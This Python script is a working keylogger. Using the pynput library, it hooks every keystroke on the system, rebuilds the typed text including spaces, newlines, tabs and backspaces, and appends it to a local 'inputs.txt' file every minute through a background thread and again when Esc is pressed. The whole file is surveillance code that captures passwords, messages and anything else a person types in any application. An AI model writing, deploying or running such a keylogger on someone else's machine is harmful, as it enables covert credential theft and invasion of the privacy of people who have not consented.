from pynput import keyboard
import threading
import time
INPS = []
LOCK = threading.Lock()

# Function to read user inputs
def on_press(key):
    try:
        # Needed as global INPS is being changed here
        with LOCK:
            # Alpha-numeric and special character handling
            INPS.append(key.char)
    
    except AttributeError:
        # Needed as global INPS is being changed here
        with LOCK:
            # Handle space
            if key == key.space:
                INPS.append(" ")
            
            # Handle enter
            elif key == key.enter:
                INPS.append("\n")
            
            # Handle backspace
            elif key == key.backspace:
                if len(INPS) != 0:
                    INPS.pop()
                pass
            # Handle tab
            elif key == key.tab:
                INPS.append("\t")
            
            # Allow user to exit program and save inputs
            elif key == key.esc:
                try:
                    with open('inputs.txt', 'a') as file:
                        inp = "".join(INPS)
                        file.write(inp)
                finally:
                    exit(0)

# Fuction sleeps for a minute and then writes to user inputs to file
def save_periodically():
    while True:
        time.sleep(60)  # Wait for a minute
        save_inputs_to_file()

# Function to write inputs to the file
def save_inputs_to_file():
    with LOCK: # Needed as global INPS is being changed here
        # Only write if there are inputs
        if INPS: 
            try:
                with open('inputs.txt', 'a') as file:
                    file.write("".join(INPS))
                INPS.clear()
            except Exception as e:
                print(f"Error saving input: {e}")

if __name__ == '__main__':
    # Create and start thread to allow automatic saving
    thread = threading.Thread(target=save_periodically)
    thread.daemon = True
    thread.start()
    
    # Start listening
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    